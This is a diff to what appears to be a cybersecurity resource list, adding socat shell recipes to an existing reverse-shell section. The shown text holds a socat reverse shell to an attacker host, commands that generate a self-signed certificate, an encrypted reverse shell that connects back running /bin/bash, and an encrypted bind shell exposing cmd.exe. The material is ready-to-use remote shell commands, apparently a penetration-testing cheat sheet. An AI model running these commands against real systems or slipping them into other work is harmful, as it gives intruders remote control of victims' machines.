@@ -70,6 +70,17 @@ List of tools/resources for Cybersecurity
 
     Final Stable linux shell
     socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+    Socat Encrypted Shell
+    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+    cat shell.key shell.crt > shell.pem
+    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+    socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash #To connect back
+
+    Socat Encrypted Bind shell
+    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+    socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+    
     ```
   - JavaScript Shell
     ```
